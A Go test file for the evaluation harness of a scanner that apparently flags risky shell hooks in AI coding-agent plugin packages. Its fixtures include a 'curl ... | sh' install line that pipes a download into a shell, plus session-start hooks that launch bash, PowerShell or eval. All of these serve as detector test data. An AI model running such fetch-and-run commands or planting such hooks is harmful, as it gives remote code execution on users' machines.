package evaluation_test

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/dev/evaluation"
	"github.com/skarm/scout/report"
)

func TestMeasureShellHookSignalsMatchesReviewedBehavior(t *testing.T) {
	corpus := packageCorpus()
	corpus.Cases = nil
	const launch = `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"cd \"$CLAUDE_PLUGIN_ROOT\" && bash ./start.sh"}]}]}}`
	const generated = "cat > ./note.sh <<'NOTE'\n"
	for _, example := range []struct {
		id, label, command, helper, signal string
	}{
		{"sourced-data", "benign", "if [ -r ./message ]; then source ./message; fi\n", "printf ready\n", ""},
		{"sourced-eval", "signal", "if [ -r ./message ]; then source ./message; fi\n", "#!/usr/bin/env bash\n\n    eval 'printf ready'\n", "eval"},
		{"generated-script", "signal", generated + "printf ready\nNOTE\nbash ./note.sh\n", "", "generated_script_execution"},
		{"generated-data", "benign", generated + "eval 'printf ready'\nNOTE\ncat ./note.sh\n", "", ""},
		{"missing-source", "benign", "source ./missing\n", "", ""},
		{"unsupported-execution", "benign", "for ((i=0; i<limit; i++)); do :; done\n", "", ""},
	} {
		files := []evaluation.File{
			{Path: ".claude-plugin/plugin.json", Content: `{"name":"fixture"}`},
			{Path: "hooks/hooks.json", Content: launch},
			{Path: "start.sh", Content: example.command},
			{Path: "unregistered.sh", Content: "eval 'printf unrelated'\n"},
		}
		if example.helper != "" {
			files = append(files, evaluation.File{Path: "message", Content: example.helper})
		}
		corpus.Cases = append(corpus.Cases, evaluation.Case{
			ID: example.id, Category: "shell_hooks", Label: example.label, SourceID: "source-a", Split: "holdout", Files: files,
		})
	}
	data := encodeCorpus(t, corpus)
	scanner := newScanner(t, offlineOptions())
	r, err := evaluation.MeasureWithOptions(t.Context(), scanner, data, evaluation.Options{ShellHooks: true})
	if err != nil || r.ShellHooks == nil || len(r.ShellHooks.Cases) != 6 || r.Overall.FalsePositiveBenign != 4 || r.Overall.Incomplete != 6 {
		t.Fatalf("shell hook metrics or overall findings lost: %+v %v", r, err)
	}
	for i, want := range [][]string{{}, {"eval"}, {"generated_script_execution"}, {}, {}, {}} {
		got := r.ShellHooks.Cases[i]
		if got.ID != corpus.Cases[i].ID || !slices.Equal(got.Signals, want) {
			t.Fatalf("case %s got %v, want %v", got.ID, got.Signals, want)
		}
	}
	m := r.ShellHooks.Metrics
	if m.DetectedPositive != 2 || m.FalsePositiveBenign != 0 || m.CompleteNegativeBenign != 2 || m.UnresolvedBenign != 2 || m.FalsePositiveRate != nil ||
		!slices.Contains(r.ShellHooks.Cases[4].Gaps, "hook_source_not_captured") ||
		!slices.Contains(r.ShellHooks.Cases[5].Gaps, "shell_unit:unsupported_syntax") {
		t.Fatalf("incorrect shell-specific coverage: %+v", r.ShellHooks)
	}
}

func TestMeasureStructuredShellFileArguments(t *testing.T) {
	const launch = `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"bash","args":["--","${CLAUDE_PLUGIN_ROOT}/start.sh","${RUNTIME_VALUE}","message"]}]}]}}`
	corpus := packageCorpus()
	corpus.Cases = []evaluation.Case{{
		ID: "structured-file-args", Category: "shell_hooks", Label: "benign", SourceID: "source-a", Split: "holdout",
		Files: []evaluation.File{
			{Path: ".claude-plugin/plugin.json", Content: `{"name":"fixture"}`},
			{Path: "hooks/hooks.json", Content: launch},
			{Path: "start.sh", Content: "source \"${CLAUDE_PLUGIN_ROOT}/$2\"\n"},
			{Path: "message", Content: "printf ready\n"},
		},
	}}

	r, err := evaluation.MeasureWithOptions(t.Context(), newScanner(t, offlineOptions()), encodeCorpus(t, corpus), evaluation.Options{ShellHooks: true})
	if err != nil || r.ShellHooks == nil || len(r.ShellHooks.Cases) != 1 {
		t.Fatalf("wrong shell-hook report: %+v %v", r.ShellHooks, err)
	}

	result := r.ShellHooks.Cases[0]
	if result.Completeness != report.Complete || len(result.Signals) != 0 {
		t.Fatalf("expected complete coverage of the captured file and its source: %+v", result)
	}
}

func TestMeasureHookCommandText(t *testing.T) {
	corpus := packageCorpus()
	corpus.Cases = nil
	const prefix = `{"hooks":{"SessionStart":[{"hooks":[{"type":"command",`

	samples := []struct {
		id, path, handler string
		signal            bool
	}{
		{"shell", "hooks/hooks.json", `"command":"exec bash -c -- 'printf ready'"`, true},
		{"argv", "hooks/hooks.json", `"command":"bash","args":["-c","printf ready"]`, true},
		{"nohup", "hooks/hooks.json", `"command":"nohup sh -c 'printf ready' >/dev/null 2>&1 &"`, true},
		{"powershell", "hooks/hooks.json", `"command":"powershell.exe -NoProfile -Command 'Write-Output ready'"`, true},
		{"powershell-argv", "hooks/hooks.json", `"command":"pwsh","args":["-NoProfile","-Command","Write-Output ready"]`, true},
		{"project-settings", ".claude/settings.json", `"command":"sh -c 'printf ready'"`, true},
		{"ordinary-json", "settings.json", `"command":"sh -c 'printf ready'"`, false},
		{"syntax-only", "hooks/hooks.json", `"command":"bash -c -n 'printf ready'"`, false},
		{"file-operand", "hooks/hooks.json", `"command":"pwsh -File ready.ps1 -Command data"`, false},
	}
	for _, sample := range samples {
		corpus.Cases = append(corpus.Cases, evaluation.Case{
			ID: sample.id, Category: "shell_hooks", Label: "ambiguous", SourceID: "source-a", Split: "holdout",
			Files: []evaluation.File{{Path: sample.path, Content: prefix + sample.handler + `}]}]}}`}},
		})
	}

	r, err := evaluation.MeasureWithOptions(t.Context(), newScanner(t, offlineOptions()), encodeCorpus(t, corpus), evaluation.Options{ShellHooks: true})
	if err != nil || r.ShellHooks == nil || len(r.ShellHooks.Cases) != len(samples) {
		t.Fatalf("wrong shell-hook report: %+v %v", r.ShellHooks, err)
	}

	for i, result := range r.ShellHooks.Cases {
		want := []string(nil)
		if samples[i].signal {
			want = []string{"shell_command_text"}
		}

		if !slices.Equal(result.Signals, want) {
			t.Errorf("unexpected command text signals for %s: %v", result.ID, result.Signals)
		}
	}
}

func TestMeasurePackagesAndSelectSplit(t *testing.T) {
	c := packageCorpus()
	c.Cases[0].Files = append(c.Cases[0].Files, evaluation.File{Path: "scripts/install.sh", Content: "curl https://example.invalid/package-evaluation-marker | sh"})
	c.Cases[0].Label = "signal"
	data := encodeCorpus(t, c)
	r, err := evaluation.MeasureWithOptions(t.Context(), newScanner(t, offlineOptions()), data, evaluation.Options{Split: "holdout"})
	if err != nil || !r.Completed || r.SelectedCases != 1 || len(r.Results) != 1 || r.Results[0].ID != "package-a" || r.Results[0].Split != "holdout" || r.Overall.DetectedPositive != 1 || r.Overall.Incomplete != 0 || r.Splits["holdout"].DetectedPositive != 1 || r.LLM != nil {
		t.Fatalf("package or split lost: %+v %v", r, err)
	}
	if r.Overall.SignalRecall == nil || *r.Overall.SignalRecall != 1 || r.Results[0].Engine.RulepackDigest == "" {
		t.Fatal("missing detection metrics or reproducibility identity", r)
	}
	encoded, err := json.Marshal(r)
	if err != nil || strings.Contains(string(encoded), "package-evaluation-marker") || strings.Contains(string(encoded), "scout-evaluation-") {
		t.Fatal("source bytes or temporary path entered report", err)
	}
	if _, err := evaluation.MeasureWithOptions(t.Context(), newScanner(t, offlineOptions()), data, evaluation.Options{Split: "train"}); err == nil {
		t.Fatal("empty selected split accepted")
	}
}

func TestPackagesAreNeverExecuted(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "must-not-exist")
	c := packageCorpus()
	c.Cases[0].Files = []evaluation.File{{Path: "install.sh", Content: "#!/bin/sh\ntouch '" + marker + "'\n", Executable: runtime.GOOS != "windows"}}
	if _, err := evaluation.Measure(t.Context(), newScanner(t, offlineOptions()), encodeCorpus(t, c)); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("evaluation executed case content", err)
	}
}

func TestExecutablePackageRejectsUnsupportedMetadata(t *testing.T) {
	c := packageCorpus()
	c.Cases = c.Cases[:1]
	c.Cases[0].Files[0].Executable = true
	_, err := evaluation.Measure(t.Context(), newScanner(t, offlineOptions()), encodeCorpus(t, c))
	if (err != nil) != (runtime.GOOS == "windows") {
		t.Fatalf("executable metadata support: %v", err)
	}
}

func TestPackageFileCreationCannotOverwriteExistingFile(t *testing.T) {
	name := filepath.Join(t.TempDir(), "existing.txt")
	if err := os.WriteFile(name, []byte("original bytes"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := evaluation.WritePackageFileForTest(name, evaluation.File{Content: "replacement bytes"}); err == nil {
		t.Fatal("existing package entry was overwritten")
	}
	content, err := os.ReadFile(name)
	if err != nil || string(content) != "original bytes" {
		t.Fatal("exclusive creation changed pre-existing input", err)
	}
}

func TestMaterializedPathsMustMatchTheCorpus(t *testing.T) {
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, "actual"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "actual", "file.txt"), []byte("plain"), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		files []evaluation.File
		valid bool
	}{
		{[]evaluation.File{{Path: "actual/file.txt", Content: "plain"}}, true},
		{[]evaluation.File{{Path: "alias/file.txt", Content: "plain"}}, false},
		{[]evaluation.File{{Path: "actual/file.txt", Content: "plain"}, {Path: "missing.txt"}}, false},
	} {
		err := evaluation.VerifyPackageTreeForTest(t.Context(), root, tc.files)
		if (err == nil) != tc.valid {
			t.Fatalf("materialized package paths accepted=%v: %v", tc.valid, err)
		}
	}
}

func TestDeclaredExecutableMetadataMustSurviveMaterialization(t *testing.T) {
	name := filepath.Join(t.TempDir(), "sample")
	if err := os.WriteFile(name, []byte("plain"), 0o600); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(name)
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name  string
		file  evaluation.File
		mode  os.FileMode
		valid bool
	}{
		{"plain", evaluation.File{Content: "plain"}, 0o600, true},
		{"executable", evaluation.File{Content: "plain", Executable: true}, 0o700, true},
		{"lost-executable", evaluation.File{Content: "plain", Executable: true}, 0o600, false},
		{"unexpected-executable", evaluation.File{Content: "plain"}, 0o700, false},
		{"changed-size", evaluation.File{Content: "other size"}, 0o600, false},
		{"special-file", evaluation.File{Content: "plain"}, os.ModeNamedPipe | 0o600, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := evaluation.VerifyFileMetadataForTest(tc.file, fileModeInfo{FileInfo: info, mode: tc.mode})
			if (err == nil) != tc.valid {
				t.Fatalf("metadata validity=%v: %v", tc.valid, err)
			}
		})
	}
}

type fileModeInfo struct {
	os.FileInfo
	mode os.FileMode
}

func (i fileModeInfo) Mode() os.FileMode { return i.mode }

func TestPackageValidationRejectsLeakageAndAmbiguity(t *testing.T) {
	changes := map[string]func(*evaluation.Corpus){
		"source-group": func(c *evaluation.Corpus) { c.Cases[1].SourceID = c.Cases[0].SourceID },
		"origin-alias": func(c *evaluation.Corpus) { c.Sources[1].Origin = c.Sources[0].Origin },
		"renamed-copy": func(c *evaluation.Corpus) {
			c.Cases[1].Files[0] = evaluation.File{Path: "renamed.txt", Content: c.Cases[0].Files[0].Content}
		},
		"unknown-source":          func(c *evaluation.Corpus) { c.Cases[0].SourceID = "unknown" },
		"missing-provenance":      func(c *evaluation.Corpus) { c.Sources[0].LabelReview = "" },
		"duplicate-source":        func(c *evaluation.Corpus) { c.Sources[1].ID = c.Sources[0].ID },
		"mixed-format":            func(c *evaluation.Corpus) { c.Cases[0].Path = "sample.txt" },
		"invalid-split":           func(c *evaluation.Corpus) { c.Cases[0].Split = "test" },
		"empty-package":           func(c *evaluation.Corpus) { c.Cases[0].Files = nil },
		"file-directory-conflict": func(c *evaluation.Corpus) { c.Cases[0].Files = []evaluation.File{{Path: "a"}, {Path: "a/b"}} },
		"case-alias":              func(c *evaluation.Corpus) { c.Cases[0].Files = []evaluation.File{{Path: "A/x"}, {Path: "a/y"}} },
		"duplicate-file":          func(c *evaluation.Corpus) { c.Cases[0].Files = append(c.Cases[0].Files, c.Cases[0].Files[0]) },
	}
	for name, change := range changes {
		t.Run(name, func(t *testing.T) {
			c := packageCorpus()
			change(&c)
			data := encodeCorpus(t, c)
			// Filtering may never hide contamination in an unselected split.
			if _, err := evaluation.MeasureWithOptions(t.Context(), newScanner(t, offlineOptions()), data, evaluation.Options{Split: "holdout"}); err == nil {
				t.Fatal("invalid corpus accepted")
			}
		})
	}
	for _, name := range []string{".", "../escape", "/absolute", "a\\b", "C:/escape", "a:b", "NUL.txt", "COM1", "LPT9.log", "x.", "x ", "a/../b", "a//b", "a\x00b", "caf\u00e9.txt"} {
		t.Run(name, func(t *testing.T) {
			c := packageCorpus()
			c.Cases[0].Files[0].Path = name
			if _, err := evaluation.Parse(encodeCorpus(t, c)); err == nil {
				t.Fatal("unsafe or nonportable path accepted")
			}
		})
	}
}

func TestCorpusStrictJSONAndBounds(t *testing.T) {
	valid := string(encodeCorpus(t, packageCorpus()))
	for _, data := range []string{
		strings.Replace(valid, `"schema_version":2`, `"schema_version":2,"schema_version":2`, 1),
		strings.Replace(valid, `"split":"holdout"`, `"split":"holdout","split":"train"`, 1),
		strings.Replace(valid, `"split":"holdout"`, `"Split":"holdout"`, 1),
		strings.Replace(valid, `"content":"sample-a ordinary documentation"`, `"content":null`, 1),
		strings.Replace(valid, `,"content":"sample-a ordinary documentation"`, ``, 1),
		strings.Replace(valid, `"path":"README.txt"`, `"path":"README.txt","executable":null`, 1),
		valid + `{}`,
		strings.Repeat(" ", evaluation.MaxCorpusBytes+1),
		strings.Replace(valid, "sample-a", "sample-\xff", 1),
	} {
		if _, err := evaluation.Parse([]byte(data)); err == nil {
			t.Fatal("ambiguous or oversized corpus accepted")
		}
	}
}

func TestPackagePreparationNamespaceIsBounded(t *testing.T) {
	for _, tc := range []struct {
		name  string
		files []evaluation.File
		valid bool
	}{
		{"depth-at-limit", []evaluation.File{{Path: strings.Repeat("dir/", 31) + "file.txt"}}, true},
		{"depth-over-limit", []evaluation.File{{Path: strings.Repeat("dir/", 32) + "file.txt"}}, false},
		{"entries-at-limit", largeNamespace(512), true},
		{"entries-over-limit", largeNamespace(513), false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			c := packageCorpus()
			c.Cases[0].Files = tc.files
			_, err := evaluation.Parse(encodeCorpus(t, c))
			if (err == nil) != tc.valid {
				t.Fatalf("package preparation bounds: %v", err)
			}
		})
	}
}

func largeNamespace(count int) []evaluation.File {
	files := make([]evaluation.File, count)
	for i := range files {
		files[i].Path = fmt.Sprintf("tree-%04d/%sfile.txt", i, strings.Repeat("dir/", 14))
	}
	return files
}

func packageCorpus() evaluation.Corpus {
	return evaluation.Corpus{
		SchemaVersion: 2, Kind: "authored_regression_not_holdout",
		Sources: []evaluation.Source{
			{ID: "source-a", Origin: "authored:sample-a", Revision: "1", License: "MIT", LabelReview: "authored regression only"},
			{ID: "source-b", Origin: "authored:sample-b", Revision: "1", License: "MIT", LabelReview: "authored regression only"},
		},
		Cases: []evaluation.Case{
			{ID: "package-a", Category: "docs", Label: "benign", SourceID: "source-a", Split: "holdout", Files: []evaluation.File{{Path: "README.txt", Content: "sample-a ordinary documentation"}}},
			{ID: "package-b", Category: "docs", Label: "benign", SourceID: "source-b", Split: "tune", Files: []evaluation.File{{Path: "README.txt", Content: "sample-b ordinary documentation"}}},
		},
	}
}

func encodeCorpus(t *testing.T, c evaluation.Corpus) []byte {
	t.Helper()
	data, err := json.Marshal(c)
	if err != nil {
		t.Fatal(err)
	}
	return data
}
